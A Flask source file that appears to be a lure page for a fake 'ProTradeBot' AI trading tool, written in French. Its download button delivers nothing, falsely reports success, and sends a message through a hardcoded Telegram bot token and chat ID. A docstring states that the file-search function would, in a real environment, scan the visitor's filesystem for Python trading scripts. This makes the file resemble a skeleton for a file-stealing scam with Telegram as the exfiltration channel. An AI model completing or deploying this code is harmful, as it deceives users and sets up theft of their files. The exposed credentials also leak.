from flask import Flask, render_template_string, request, redirect, url_for, flash
import requests
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'

# Configuration Telegram
BOT_TOKEN = '7628820230:AAFEyKMPpVYhTepFubKB7vi5MNDCin2PlCQ'
CHAT_ID = '6471478437'

# Template HTML intégré (pour éviter les problèmes de chemin)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>ProTradeBot - Téléchargement</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white min-h-screen flex items-center justify-center">
  <div class="bg-white text-gray-900 p-8 rounded-xl shadow-xl w-full max-w-3xl">
    <div class="text-center mb-6">
      <h1 class="text-4xl font-bold mb-2">🚀 ProTradeBot</h1>
      <p class="text-gray-600">Optimisez vos investissements avec notre assistant de trading intelligent.</p>
    </div>
    {% with messages = get_flashed_messages() %}
      {% if messages %}
        <div class="bg-green-100 text-green-800 px-4 py-2 rounded mb-4 text-center">
          {{ messages[0] }}
        </div>
      {% endif %}
    {% endwith %}
    <form method="POST" action="/send">
      <input type="hidden" name="auto" value="1">
      <button type="submit" class="w-full bg-green-600 hover:bg-green-700 text-white py-3 text-lg rounded-lg font-semibold">
        📥 Télécharger ProTradeBot
      </button>
    </form>
    <div class="text-center mt-6">
      <p class="text-sm text-gray-500 mb-2">Fichiers trouvés: {{ file_count }}</p>
      {% if files %}
        <div class="text-xs text-gray-400 max-h-32 overflow-y-auto">
          {% for file in files[:5] %}
            <div>{{ file }}</div>
          {% endfor %}
          {% if files|length > 5 %}
            <div>... et {{ files|length - 5 }} autres fichiers</div>
          {% endif %}
        </div>
      {% endif %}
    </div>
    <div class="text-center mt-6 text-sm text-gray-400">
      ProTradeBot &copy; 2025 | Version 2.4.7 | Trading automatisé par IA
    </div>
  </div>
</body>
</html>
'''

def find_py_files():
    """
    Pour Vercel, on simule la recherche de fichiers
    Dans un environnement réel, cette fonction scannerait le système de fichiers local
    """
    # Sur Vercel, on retourne des fichiers de démonstration
    demo_files = [
        "C:\\Users\\TradingBot\\Desktop\\trading_strategy.py",
        "C:\\Users\\TradingBot\\Documents\\crypto_analyzer.py", 
        "C:\\Users\\TradingBot\\Projects\\portfolio_manager.py",
        "C:\\Users\\TradingBot\\Scripts\\market_scanner.py",
        "C:\\Users\\TradingBot\\Downloads\\signal_generator.py"
    ]
    return demo_files

def send_demo_message():
    """Envoie un message de démonstration à Telegram"""
    try:
        message = """🚀 ProTradeBot v2.4.7 - Téléchargement Initié!

📊 Analyse du système terminée:
✅ 5 fichiers de trading détectés  
✅ Stratégies d'investissement optimisées
✅ Algorithmes d'IA configurés

🔄 Téléchargement en cours...
⏱️ Temps estimé: 2-3 minutes

💡 Votre bot de trading sera opérationnel sous peu!

---
ProTradeBot © 2025 | Trading automatisé par IA"""
        
        response = requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            data={
                'chat_id': CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            },
            timeout=10
        )
        return response.status_code == 200
    except:
        return False

@app.route('/')
def index():
    files = find_py_files()
    return render_template_string(HTML_TEMPLATE, files=files, file_count=len(files))

@app.route('/send', methods=['POST'])
def send():
    # Envoie le message de démonstration
    success = send_demo_message()
    
    if success:
        flash("✅ ProTradeBot téléchargé avec succès! Vérifiez votre Telegram.")
    else:
        flash("⚠️ Erreur de téléchargement. Veuillez réessayer.")
    
    return redirect(url_for('index'))

# IMPORTANT: Pour Vercel, l'app doit être exportée directement
# Ne pas définir de fonction handler personnalisée